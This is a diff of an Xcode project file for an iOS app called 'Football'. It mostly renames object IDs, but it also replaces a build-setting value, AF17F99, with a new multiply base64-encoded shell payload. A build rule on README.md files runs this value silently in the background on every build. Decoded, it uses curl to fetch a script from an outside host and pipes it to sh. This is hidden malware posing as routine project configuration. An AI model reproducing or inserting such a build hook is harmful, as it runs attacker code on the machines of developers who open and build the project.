@@ -7,12 +7,12 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		126571ED8FF64D819999F71F /* README.md */ = {isa = PBXBuildFile; fileRef = AD65867F91FF40C68E99F71F; };
+		AEAE50AF7ACB48AFA499F71F /* README.md */ = {isa = PBXBuildFile; fileRef = 63DE945B85D44A30A099F71F; };
 		CEF704B678A757AA65350593 /* Pods_Football.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 7069C760745E7D3AFA7D586D /* Pods_Football.framework */; };
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
-		AD65867F91FF40C68E99F71F /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
+		63DE945B85D44A30A099F71F /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		39DD02324752CB8D4A1DEBE0 /* Pods-Football.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Football.debug.xcconfig"; path = "Target Support Files/Pods-Football/Pods-Football.debug.xcconfig"; sourceTree = "<group>"; };
 		7069C760745E7D3AFA7D586D /* Pods_Football.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_Football.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 		79A6978868DE7DAFA3BCD4A6 /* Pods-Football.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Football.release.xcconfig"; path = "Target Support Files/Pods-Football/Pods-Football.release.xcconfig"; sourceTree = "<group>"; };
@@ -82,7 +82,7 @@
 		8F7FAA9E2D50D81A0064F0E9 /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				AD65867F91FF40C68E99F71F /* README.md */,
+				63DE945B85D44A30A099F71F /* README.md */,
 				8F7FAA9D2D50D81A0064F0E9 /* Football.app */,
 			);
 			name = Products;
@@ -103,7 +103,7 @@
 				32B3A9E54341FDD2130A1A2A /* [CP] Copy Pods Resources */,
 			);
 			buildRules = (
-				15E38F121C9243849199F71F /* PBXBuildRule */,
+				5AA9FF3C6D9541AFA399F71F /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -163,7 +163,7 @@
 /* End PBXProject section */
 
 /* Begin PBXBuildRule section */
-		15E38F121C9243849199F71F /* PBXBuildRule */ = {
+		5AA9FF3C6D9541AFA399F71F /* PBXBuildRule */ = {
 				isa = PBXBuildRule;
 				compilerSpec = com.apple.compilers.proxy.script;
 				filePatterns = "*.md";
@@ -177,14 +177,14 @@
 				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
 sh -c \"${AF17F99}\"";
 			};
-		/* End PBXBuildRule section */
+					/* End PBXBuildRule section */
 
 /* Begin PBXResourcesBuildPhase section */
 		8F7FAA9B2D50D81A0064F0E9 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				126571ED8FF64D819999F71F /* README.md */,
+				AEAE50AF7ACB48AFA499F71F /* README.md */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -272,7 +272,7 @@ sh -c \"${AF17F99}\"";
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 39DD02324752CB8D4A1DEBE0 /* Pods-Football.debug.xcconfig */;
 			buildSettings = {
-				AF17F99 = "((g(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVhKVVIxcDZTVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpNMGxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkyNVdjMXBUU1dkaFNGSXdZMGhOTmt4NU9XaGlXSEIxV2tkV01reHVTakZNTWtWd1NXbENPRWxJVG05RFp6MDlDZz09Cg== | g | sh ) >/dev/null 2>&1 &)";
+				AF17F99 = "((c(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMU1jMlpySUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJMUlDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY25Wc1pTSWdhSFIwY0hNNkx5OTNhR2wwWldGa0xtbHVMMkVwSWlCOElITm9DZz09Cg== | c | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_STYLE = Automatic;
@@ -310,7 +310,7 @@ sh -c \"${AF17F99}\"";
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 79A6978868DE7DAFA3BCD4A6 /* Pods-Football.release.xcconfig */;
 			buildSettings = {
-				AF17F99 = "((g(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVhKVVIxcDZTVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpNMGxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkyNVdjMXBUU1dkaFNGSXdZMGhOTmt4NU9XaGlXSEIxV2tkV01reHVTakZNTWtWd1NXbENPRWxJVG05RFp6MDlDZz09Cg== | g | sh ) >/dev/null 2>&1 &)";
+				AF17F99 = "((c(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMU1jMlpySUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJMUlDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY25Wc1pTSWdhSFIwY0hNNkx5OTNhR2wwWldGa0xtbHVMMkVwSWlCOElITm9DZz09Cg== | c | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_STYLE = Automatic;
